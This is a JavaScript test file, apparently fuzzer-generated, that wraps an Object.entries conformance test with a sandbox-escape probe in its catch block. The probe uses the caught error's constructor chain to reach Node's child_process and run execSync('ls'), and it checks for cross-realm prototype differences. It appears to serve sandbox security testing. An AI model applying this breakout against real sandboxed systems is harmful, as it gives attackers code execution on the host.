try {
    var value = {};
    var enumSym = Symbol('enum');
    var nonEnumSym = Symbol('nonenum');
    var symValue = Symbol('value');
    var obj = { key: symValue };
    obj[enumSym] = value;
    Object.defineProperty(obj, nonEnumSym, {
        enumerable: false,
        value: value
    });
    var result = Object.entries(obj);
    assert.sameValue(Array.isArray(result), true, 'result is an array');
    assert.sameValue(result.length, 1, 'result has 1 item');
    assert.sameValue(Array.isArray(result[0]), true, 'first entry is an array');
    assert.sameValue(result[0][0], 'key', 'first entry has key "key"');
    assert.sameValue(result[0][1], symValue, 'first entry has value `symValue`');
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}